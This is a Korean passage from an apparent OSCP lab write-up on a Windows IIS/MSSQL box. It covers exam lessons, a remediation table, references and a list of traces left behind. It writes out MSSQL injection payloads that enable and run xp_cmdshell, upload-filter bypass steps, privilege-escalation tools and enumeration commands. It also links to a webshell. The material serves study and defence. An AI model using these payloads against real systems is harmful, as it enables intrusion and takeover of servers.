| FTP(21) 익명 로그인 + 웹루트와 겹치는지 | 결과 기록 없음 | IIS FTP 가 웹루트를 가리키면 FTP 업로드만으로 웹셸이 된다. 매우 흔한 구성 |
| SMTP(25) `VRFY` 사용자 열거 | 결과 기록 없음 | 사용자명 목록 → 웹 로그인 브루트포스 재료 |
| MSSQL `xp_cmdshell` | 시도 기록 없음 | 스택 쿼리가 성립했으므로 DB 계정이 sysadmin 이면 **즉시 RCE**. 업로드 단계를 건너뛴다 |
| `/dev/` 의 나머지 파일 | `site.master.txt` 외 기록 없음 | `.cs` 원문에 DB 연결 문자열이 있었을 가능성 |

**[가정]** 위 갈래들은 SQLi 가 먼저 성공해서 불필요해졌을 뿐, 실패해서 버린 것이 아니다. 막혔을 때의 다음 후보로 이 표를 남긴다.

---

## 7. OSCP 시험 관점

1. **`-p-` 전수 스캔은 타협 불가다.** 이 박스의 웹은 450 이고 기본 스캔이면 못 찾는다. 급하면 2단계로 — `nmap -p- --min-rate 10000 -T4` 로 포트만 뽑고, 열린 포트에만 `-sCV -A` 를 다시 건다. ([[Hawat]] 과 동일 교훈)
2. nmap 출력에서 최종 목적지를 먼저 정하라. `5985/tcp open` 을 본 순간 목표는 "WinRM 에 쓸 자격증명 확보"로 좁혀지고, 목표가 좁혀지면 리버스셸·AV 우회 같은 곁가지에 시간을 안 쓴다.
3. IIS 타겟의 디렉터리 열거는 확장자 세트가 승부를 가른다. `-x aspx,asp,ashx,asmx,config,txt,bak,old,zip`. **`txt`·`bak`·`config` 가 소스와 자격증명을 준다.**
4. Windows 는 대소문자를 구분하지 않는다. 열거에서는 노이즈, 업로드 필터 우회에서는 무기다.
5. **`400` 은 발견이 아니다.** 추격은 `200`·`301/302`·`403` 만.
6. **SQLi 확인은 `'` → `''` → `' or '1'='1` 순서다.** `' or 1=1--` 이 실패해도 SQLi 가 없는 것이 아니고, 에러가 나는지가 판정 기준이다.
7. **에러 메시지로 DBMS 를 확정한 뒤 기법을 고른다.** `SqlException` = MSSQL = 스택 쿼리 가능 = `UPDATE`·`xp_cmdshell` 열림. MySQL+PHP/JDBC 면 스택 쿼리는 포기하고 UNION/blind 로 간다.
8. ⚠️ sqlmap 금지 → 수동 MSSQL 절차를 통째로 외워라 (2-5 의 코드블록이 그 자산이다).
   - 탐지: `'` / `' waitfor delay '0:0:5'--`
   - 열거: `' and 1=convert(int,(select ...))--` (에러 기반) / `' order by n--` → `union select`
   - RCE: `'; exec sp_configure 'xp_cmdshell',1; reconfigure; --` → `'; exec xp_cmdshell 'whoami'; --`
   - **MSSQL 스택 쿼리가 되면 `xp_cmdshell` 을 반드시 먼저 찔러라.** 되면 업로드 단계 전체를 건너뛴다.
9. 인증 우회는 읽기만이 아니다. 해시 알고리즘을 알면 `UPDATE` 로 덮어쓰는 것이 가장 빠르다. **단 원본 해시를 먼저 추출해 두고 할 것** — 크랙 기회와 원복 가능성을 동시에 지킨다.
10. **해시 길이로 알고리즘을 즉시 판정한다.** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 · `$2a$`/`$2b$` = bcrypt · `$6$` = SHA-512-crypt.
11. ⚠️ 자동 크랙 도구는 허용이지만 시간이 든다. `hashcat -m 1400`(SHA-256)/`-m 0`(MD5)은 시험에서 쓸 수 있다. 다만 rockyou 전수는 GPU 없이 오래 걸리니 5분 안에 안 깨지면 다른 경로로 넘어가라.
12. **업로드 필터는 사다리로 올라간다** — `.aspx` → `.ashx`/`.asmx` → 대소문자 변형 → 후행 점·공백 → `web.config` 업로드. Burp Repeater 로 확장자와 Content-Type 을 따로 바꿔 어느 쪽을 검사하는지 좁혀라.
13. **웹셸을 잡으면 첫 명령은 `whoami`, 두 번째는 `whoami /priv`.**
    - `SeImpersonatePrivilege` → PrintSpoofer / GodPotato
    - `nt authority\system` → 끝
    - 이 박스처럼 `net user /add` 가 그냥 되면 앱풀이 특권 신원이다
14. Windows 셸을 잡자마자 칠 열거 5개 (리눅스의 `id`·`sudo -l`·`find -perm` 대응):
    ```
    whoami /all
    net user & net localgroup administrators
    systeminfo                                  ← 패치 수준
    wmic service get name,pathname,startmode    ← 언쿼티드 경로
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    ```
15. **`whoami /groups` 에 Administrators 가 있는데 `whoami /priv` 가 초라하면 토큰 필터링이다.** 그룹을 다시 건드리지 말고 → `LocalAccountTokenFilterPolicy=1` 또는 RID 500(내장 Administrator) 또는 특권 웹셸에서 그 우회 작업을 실행(⚠️ 우회 작업만 — 플래그 읽기는 #17 참조).
16. ⚠️ 시험에서 Administrator 비밀번호를 바꾸지 마라. 되돌릴 수 없는 변조이고, 수습 수단이 revert(= 그 머신의 진척 전부 소실)뿐이다. 대안 순서: ① `LocalAccountTokenFilterPolicy` 토글(`/d 0` 으로 원복 가능) → ② SAM/SYSTEM 덤프 후 pass-the-hash(아무것도 안 바꾼다). 둘 다 목적은 대화형 셸 확보다.
17. ⚠️⚠️ 웹셸에서 플래그를 읽으면 그 박스는 0점이다. 규정 원문이 *"this includes any type of web-based shell"* 로 명시한다. **웹셸은 대화형 셸을 얻는 데 쓰고, 플래그는 그 셸에서 읽는다.** 이 한 줄이 이 노트에서 가장 비싼 교훈이다.
18. 증거 스크린샷 요건. 규정 필수는 대화형 셸에서 읽은 **플래그 내용과 타겟 IP(`ipconfig`)가 한 장에** 담기는 것, 그리고 컨트롤 패널 제출이다. 강력 권장은 `whoami`(Windows 만점 조건인 «SYSTEM/Administrator 권한 셸»을 입증하는 유일한 실무 수단)와 `hostname`. 한 줄로 붙여 실행한다 — `whoami; hostname; ipconfig; type proof.txt`.
19. 시간 배분 기준선 — 이 유형(웹 → SQLi → 업로드 → WinRM)의 목표는 **60~90분**이다.
    | 단계 | 목표 | 초과 시 |
    |---|---|---|
    | 전 포트 스캔 + 서비스 식별 | 10분 | — |
    | 웹 열거(feroxbuster + 소스 읽기) | 20분 | 확장자 세트를 넓혀 재실행 |
    | SQLi 탐지 → 인증 우회 | 20분 | `xp_cmdshell` 경로로 전환, 또는 FTP/SMTP 갈래 |
    | 업로드 → 웹셸 | 15분 | 확장자 사다리를 끝까지 (6장 ⑦) |
    | 권한상승 → 플래그 | 15분 | `whoami /priv` 재확인, 토큰 필터링 의심 |
20. **SMB/SMTP/FTP 열거가 다음 행동으로 안 이어지면 죽은 갈래다.** 사용자명 목록 그 자체는 진전이 아니다.

---

## 8. 방어 관점

| # | 결함 | 근거 | 조치 |
|---|---|---|---|
| 1 | 디렉터리 브라우징 활성화 (`/dev/`) | feroxbuster `Directory listing` | IIS 관리자에서 Directory Browsing 비활성. `web.config` 에 `<directoryBrowse enabled="false" />` |
| 2 | 소스 파일이 웹루트에 노출 (`site.master.txt`, `.cs`) | `site.master.txt` 원문 | 개발용 사본을 배포 아티팩트에서 제외. `.cs`/`.txt`/`.bak` 을 `<requestFiltering><fileExtensions>` 로 차단. 애초에 웹루트 밖(`App_Code`/`bin`)에 두기 |
| 3 | SQL 문자열 연결 | `'` 하나로 예외 발생 | `SqlParameter` 로 파라미터 바인딩. `cmd.Parameters.AddWithValue("@u", id)`. ORM(EF)을 쓰면 기본으로 안전 |
| 4 | 스택 쿼리 허용 | `; update ...; --` 성공 | DB 계정 권한 최소화 — 앱 계정에서 `UPDATE` 권한 회수, 필요한 것만 저장 프로시저로 노출 |
| 5 | 상세 에러 노출 | 에러 페이지 스크린샷 | `web.config` 에 `<customErrors mode="On" defaultRedirect="~/error.aspx" />`. 스택 트레이스·예외 타입이 새면 DBMS 판정과 스키마 열거가 열린다 |
| 6 | 솔트 없는 SHA-256 비밀번호 저장 | 해시 = `SHA256("butch")` | bcrypt / Argon2id / PBKDF2 + 계정별 솔트. 솔트가 있으면 "아는 값의 해시를 심는" 이 공격이 훨씬 어려워진다 |
| 7 | 실행 가능한 확장자 업로드 허용 + 실행 가능 경로 | `.ashx` 웹셸 동작 | 화이트리스트(허용 확장자만) + 웹루트 밖 저장 + 저장 디렉터리에 `<handlers><clear /></handlers>` 로 실행 차단. 파일명은 서버가 재생성(GUID) |
| 8 | IIS 앱풀이 특권 신원 | 웹셸에서 `net user /add` 성공 | 앱풀을 `ApplicationPoolIdentity`(기본)로. **이것만 고쳤어도 RCE 가 로컬 관리자 획득으로 이어지지 않았다** |
| 9 | `SeImpersonatePrivilege` 보유 | (일반) | ⚠️ "최신 패치 유지"는 대책이 아니다. Microsoft 는 서비스 계정 → SYSTEM 임퍼소네이션을 설계상 동작으로 취급하며 PrintSpoofer·EfsPotato·GodPotato 는 패치로 막히지 않는다(Server 2019 에서 정상 동작). 실제로 죽은 것은 JuicyPotato 하나이고 그것도 OXID 리졸버 변경의 부산물이다. 실효 있는 조치는 서비스의 `RequiredPrivileges` 에서 해당 특권 제거 · Spooler 서비스 비활성화(PrintSpoofer 차단) · 탐지 보완 — 예약 작업 생성(이벤트 4698)과 비정상 명명 파이프 생성 모니터링. 근본 대책은 #8(앱풀을 `ApplicationPoolIdentity` 로), 애초에 특권 신원을 주지 않는 것이다 |
| 10 | WinRM(5985)이 넓게 노출 | nmap | 관리 네트워크로 IP 제한, HTTPS(5986) 강제, `Remote Management Users` 멤버십 최소화 |
| 11 | 로컬 관리자 계정 생성이 무경보 | `4leaf` 생성 | 이벤트 4720(계정 생성)·4732(그룹 추가) 경보 구성 |
| 12 | 웹이 비표준 포트(450)라 보안이 아니다 | — | 포트 변경은 방어가 아니라 지연일 뿐. WAF·요청 필터링을 별도로 |

---

## 9. 참고 자료

- CVE 없음 — 커스텀 ASP.NET 애플리케이션의 설계 결함이다. OWASP A03: Injection + A01: Broken Access Control + A05: Security Misconfiguration
- ashx 웹셸 원본: https://github.com/yangbaopeng/ashx_webshell/blob/master/shell.ashx
- evil-winrm: https://github.com/Hackplayers/evil-winrm
- MSSQL `xp_cmdshell` / `sp_configure`: https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql
- UAC 원격 제한 · `LocalAccountTokenFilterPolicy`: https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction
- IIS Request Filtering(확장자 차단): https://learn.microsoft.com/en-us/iis/configuration/system.webserver/security/requestfiltering/
- PayloadsAllTheThings — MSSQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
- PrintSpoofer(SeImpersonate 악용): https://github.com/itm4n/PrintSpoofer

## 남긴 흔적

| 항목 | 상태 |
|---|---|
| DB `users` 테이블 — `butch` 의 `password_hash` 를 `SHA256("butch")` 로 덮어씀 | 원본 소실. 랩 Stop/Revert 로만 복구 |
| 업로드된 `.ashx` 웹셸 | 남아 있음 — 랩 Revert 로 소멸 |
| 로컬 계정 `4leaf` / `Password1` (Administrators + Remote Management Users) | 남아 있음 |
| 내장 `Administrator` 비밀번호를 `Password1` 로 변경 | **되돌릴 수 없음** |

획득 자격증명: `butch` / `butch` (웹앱), `4leaf` / `Password1` (로컬 관리자), `administrator` / `Password1` (변경됨).

이 목록이 곧 실무에서 하면 안 되는 것들의 목록이다. 침투테스트 보고서에는 남긴 것과 원복 방법을 반드시 적고, 원복이 불가능한 변경(해시 덮어쓰기·관리자 비밀번호 변경)은 사전 서면 승인 없이는 하지 않는다.

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Hawat]] — SQLi 로 파일을 쓰는 반대 계열. MySQL+JDBC 라 스택 쿼리가 막혔던 대조 사례 · 인용 중첩 회피 · 리버스셸 아웃바운드 포트 함정
- [[01. Pentest Foundations]] — Butch 항목
